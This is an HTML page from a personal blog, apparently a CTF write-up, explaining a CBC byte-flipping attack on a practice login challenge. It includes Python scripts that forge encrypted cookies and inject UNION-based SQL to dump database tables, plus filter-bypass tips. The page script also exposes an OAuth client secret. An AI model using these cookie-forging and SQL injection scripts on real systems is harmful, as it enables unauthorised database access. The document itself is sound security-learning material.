@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="whip1ash&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      shiyanbar-ALL-writeup(1) | whip1ash
+    
+  </title>
+  <link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdn.bootcss.com/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+  <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdn.bootcss.com/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+  <script src="/js/qrious.js"></script>
+<script src="/js/gitment.js"></script>
+</head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>whip1ash</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>shiyanbar-ALL-writeup(1)</h2>
+  <p class="post-date">2018-03-26</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><p>#shiyanbar-ALL-writeup(1)</p>
+<p>最近搞一波ctf，巩固一下基础，搞一些原来没有注意到的点。</p>
+<h2 id="简单的登录题"><a href="#简单的登录题" class="headerlink" title="简单的登录题"></a>简单的登录题</h2><p>遍历一下ascii 0-255 发现过滤了<code># , - = \ ~</code>, 没有过滤<code>&#39;</code>扔一个进去，回显hello,再回到index的时候显示报错信息，考虑报错注入。说明记录了每次输入的数据，然后通过cookie回显回来。同样可以说明cookie中包含了payload（这点我没想到，第一是对密码学不熟悉，第二真实环境这样用的概率不大，但是想一想也是有可能的，毕竟内存里做加密与解密比读写sql IO要快的多）</p>
+<p>test.php爆出了源码，逻辑挺简单的，感觉思路就是利用cookie绕waf，只要控制set-cookie，就可以随意输入了。但是不知道private key。这有点蛋疼。</p>
+<p>所以接下来的思路就是刚密码学了，我觉得这个题出的很不好。。。web偏弄密码学，纯粹为了出题而出题。。。</p>
+<p><code>google:attack aes-128-cbc</code> and you will get <code>CBC Byte Flipping Attack</code></p>
+<blockquote>
+<p><a href="http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/#gref" target="_blank" rel="external">http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/#gref</a></p>
+</blockquote>
+<p>–<br><em>以下是我对 CBC Byte Flipping Attack 的一点点理解</em></p>
+<p><img src="/media/15220791938043.jpg" alt="Encryption"></p>
+<p><img src="/media/15220792285709.jpg" alt="decryption"></p>
+<p>知道了是如何加密与解密，其实理解起来就相对比较简单了，可能还需要对异或的性质有一些了解： </p>
+<ol>
+<li>异或运算法则：不同则为1，相同则为0</li>
+<li>如果 <code>A xor B = C</code> 那么则有 <code>C xor B = A</code></li>
+<li><code>A xor A = 0</code></li>
+</ol>
+<p>如果改变Ciphertext其中的1 byte必定会影响下一个chunk相同位置的Plaintext 1 byte，这样的话，被改变的Ciphertext也就不能得到正确的明文啦，如图：<br><img src="/media/15220806915665.jpg" alt=""></p>
+<p>现在我们可以控制输入了，我们如何能让Plaintext变成我们想要的value呢？其实很简单，这里面涉及一个简单的运算(Example for 1 byte)。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">A = pre-chunck-byte-Ciphertext</span><br><span class="line">B = 经过解密运算的Ciphertext</span><br><span class="line">C = Correct-Plaintext （正确的明文）</span><br><span class="line"></span><br><span class="line">已知： A xor B = C</span><br><span class="line">可以通过以下运算得到Wanted-Plaintext</span><br><span class="line">A xor B = C , C xor B = A </span><br><span class="line">A xor B xor C = C xor C = 0</span><br><span class="line">A xor B xor C xor Wanted-Plaintext = Wanted-Plaintext (D)</span><br><span class="line"></span><br><span class="line">现在我们得到了Wanted-Plaintext，但是我们需要修改的是pre-chunck-byte-Ciphertext</span><br><span class="line">我们对A xor C xor D 进行解密得 A xor C xor D xor B = D</span><br><span class="line">所以需要修改的值 edit-value = A xor C xor D </span><br><span class="line">= pre-chunck-byte-Ciphertext xor Correct-Plaintext xor Wanted-Plaintext</span><br></pre></td></tr></table></figure>
+<p>–<br>那么这里就出现了一个问题，我们修改后的pre-chunck-byte-Ciphertext解密出来将是乱码，在本题序列化的环境下必定会导致反序列化失败。其实解决办法也很简单，我们padding data，让pre-chunck-byte-Ciphertext为数据区就行了，只要不影响结构就没有问题。</p>
+<p>写脚本的时候用了bytearray，这是一个引用，对其进行更改会直接更改内存。复制的话使用 <code>tmp_value = value[:]</code></p>
+<p>我使用padding形式去fuzz payload,但是坑爹的mysql对于他无法识别的字符会报错。<br><img src="/media/15222152560765.jpg" alt=""><br>这就很坑了。下面是一个很简单的Fuzz脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">from binascii import a2b_base64,b2a_base64</span><br><span class="line">from urllib.parse import unquote,quote</span><br><span class="line"></span><br><span class="line">URL = r&apos;http://ctf5.shiyanbar.com/web/jiandan/index.php&apos;</span><br><span class="line"></span><br><span class="line">def get_cipher(fuzz):</span><br><span class="line"></span><br><span class="line">    fuzz0 = f&quot;111111111111&#123;fuzz&#125;111\&quot;1&quot;</span><br><span class="line">    data = &#123;&apos;id&apos;:fuzz0&#125;</span><br><span class="line">    res = requests.post(URL, data=data)</span><br><span class="line">    cookies = res.headers[&apos;Set-Cookie&apos;]</span><br><span class="line">    iv = re.findall(r&apos;iv=(.*?),&apos;, cookies)[0]</span><br><span class="line">    cipher = re.findall(r&apos;cipher=(.*)&apos;, cookies)[0]</span><br><span class="line"></span><br><span class="line">    return iv,cipher</span><br><span class="line"></span><br><span class="line">def attack(ciphertext,offset,plain,value,iv=&apos;&apos;):</span><br><span class="line">    length = len(ciphertext)</span><br><span class="line"></span><br><span class="line">    if offset &gt; length:</span><br><span class="line">        return &quot;Error: Offset &gt; Length&quot;</span><br><span class="line">    elif offset-16 &lt; 0 and iv.strip() !=&apos;&apos;:</span><br><span class="line">        iv[offset] = iv[offset] ^ ord(plain) ^ord(value)</span><br><span class="line">        return iv</span><br><span class="line"></span><br><span class="line">    elif offset-16 &gt;= 0:</span><br><span class="line">        ciphertext[offset-16] = ciphertext[offset-16] ^ ord(plain) ^ ord(value)</span><br><span class="line">        return ciphertext</span><br><span class="line">    else:</span><br><span class="line">        return &apos;Error: You may need a iv&apos;</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    while 1:</span><br><span class="line">        iv,cipher = get_cipher(&apos;qqqqqqqqqqqqqqqq&apos;)</span><br><span class="line"></span><br><span class="line">        cipher = bytearray(a2b_base64(unquote(cipher)))</span><br><span class="line">        attack_cipher = attack(cipher,49,&apos;1&apos;,&apos;,&apos;)</span><br><span class="line">        attack_cipher = attack(attack_cipher,52,&apos;1&apos;,&apos;#&apos;)</span><br><span class="line"></span><br><span class="line">        attack_cipher = quote(b2a_base64(attack_cipher))</span><br><span class="line">        print (attack_cipher)</span><br><span class="line">        cookies = &#123;&apos;iv&apos;:iv,&apos;cipher&apos;:attack_cipher&#125;</span><br><span class="line">        cont = requests.get(URL, cookies=cookies).content</span><br><span class="line">        if b&apos;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near&apos;  in cont:</span><br><span class="line">            print(f&quot;Response is &#123;cont&#125;&quot;)</span><br><span class="line">            print(f&quot;iv is &#123;iv&#125;&quot;)</span><br><span class="line">            print(f&quot;attack_cipher is &#123;attack_cipher&#125;&quot;)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+<p>如果不是mysql的话而是比如执行系统命令的话这里应该很好用。<br>看了看wp，pcat用了一个小trick，他为了保证序列化结构的不变，他在改变了上一个block的一个字节后，又为了保证上一个block不改变，再翻转上上一个block的每个字节，最后全部翻转iv。<br>这种解法效率很低，感觉可以报错注入，但是目前并没有进展。贴一下pcat的poc。这个题大概浪费了一天左右的时间，时间主要花费在了了解原理后的复现，远程复现很多地方很模糊，在本地又搞了很多复现的环境。还有，最近转了python3，很多地方用的很不习惯，写poc浪费了太多时间。</p>
+<blockquote>
+<p>bypass tips:<br>尽可能只翻转一个字节，例如把2nion翻转为union，末尾再用;%00来注释掉后面<br>由于逗号被过滤，用join来代替；等号被过滤，用regexp来代替</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">from base64 import *</span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def mydecode(value):</span><br><span class="line">    return b64decode(urllib.unquote(value))</span><br><span class="line"></span><br><span class="line">def myencode(value):</span><br><span class="line">    return urllib.quote(b64encode(value))</span><br><span class="line"></span><br><span class="line">def mycbc(value,idx,c1,c2):</span><br><span class="line">    lst=list(value)</span><br><span class="line">    lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))</span><br><span class="line">    return &apos;&apos;.join(lst)</span><br><span class="line"></span><br><span class="line">def pcat(payload,idx,c1,c2):</span><br><span class="line">    url=r&apos;http://ctf5.shiyanbar.com/web/jiandan/index.php&apos;</span><br><span class="line">    myd=&#123;&apos;id&apos;:payload&#125;</span><br><span class="line">    res=requests.post(url,data=myd)</span><br><span class="line">    cookies=res.headers[&apos;Set-Cookie&apos;]</span><br><span class="line"></span><br><span class="line">    iv=re.findall(r&apos;iv=(.*?),&apos;,cookies)[0]</span><br><span class="line">    cipher=re.findall(r&apos;cipher=(.*)&apos;,cookies)[0]</span><br><span class="line"></span><br><span class="line">    iv_raw=mydecode(iv)</span><br><span class="line">    cipher_raw=mydecode(cipher)</span><br><span class="line"></span><br><span class="line">    cipher_new=myencode(mycbc(cipher_raw,idx,c1,c2))</span><br><span class="line">    cookies_new=&#123;&apos;iv&apos;:iv,&apos;cipher&apos;:cipher_new&#125;</span><br><span class="line">    cont=requests.get(url,cookies=cookies_new).content</span><br><span class="line">    plain=b64decode(re.findall(r&quot;base64_decode\(&apos;(.*?)&apos;\)&quot;,cont)[0])</span><br><span class="line"></span><br><span class="line">    first=&apos;a:1:&#123;s:2:&quot;id&quot;;s:&apos;</span><br><span class="line">    iv_new=&apos;&apos;</span><br><span class="line">    for i in range(16):</span><br><span class="line">        iv_new+=chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))</span><br><span class="line">    iv_new=myencode(iv_new)</span><br><span class="line"></span><br><span class="line">    cookies_new=&#123;&apos;iv&apos;:iv_new,&apos;cipher&apos;:cipher_new&#125;</span><br><span class="line">    cont=requests.get(url,cookies=cookies_new).content</span><br><span class="line">    print &apos;Payload:%s\n&gt;&gt; &apos; %(payload)</span><br><span class="line">    print cont</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def foo():</span><br><span class="line">    pcat(&apos;12&apos;,4,&apos;2&apos;,&apos;#&apos;)</span><br><span class="line">    pcat(&apos;0 2nion select * from((select 1)a join (select 2)b join (select 3)c);&apos;+chr(0),6,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">    pcat(&apos;0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);&apos;+chr(0),7,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">    pcat(&quot;0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp &apos;you_want&apos;)b join (select 3)c);&quot;+chr(0),7,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">    pcat(&quot;0 2nion select * from((select 1)a join (select value from you_want limit 1)b join (select 3)c);&quot;+chr(0),6,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    foo()</span><br><span class="line">    print &apos;ok&apos;</span><br></pre></td></tr></table></figure>
+<p>–</p>
+</section>
+    <!-- Tags START -->
+    
+    <!-- Tags END -->
+    <!-- 打赏 START -->
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    <div class="qrcode">
+      <canvas id="share-qrcode"></canvas>
+      <p class="notice">扫描二维码，分享此文章</p>
+    </div>
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#简单的登录题"><span class="toc-nav-text">简单的登录题</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'https://whip1ash.github.io/2018/03/26/shiyanbar-ALL-writeup/';
+    var banner = 'undefined'
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+     // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+        
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+
+    // qrcode
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+
+    // gitment
+    var gitmentConfig = "whip1ash";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "shiyanbar-ALL-writeup(1)",
+        owner: "whip1ash",
+        repo: "whip1ash.github.io",
+        oauth: {
+          client_id: "ae16d933c78b6cc642c8",
+          client_secret: "e9045e51de8f846b89b22e347cd34d1fe345c533"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  })();
+</script>
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2018 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng">yanm1ng</a>
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine == 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+<script src="/js/script.js"></script>
+  </body>
+</html>
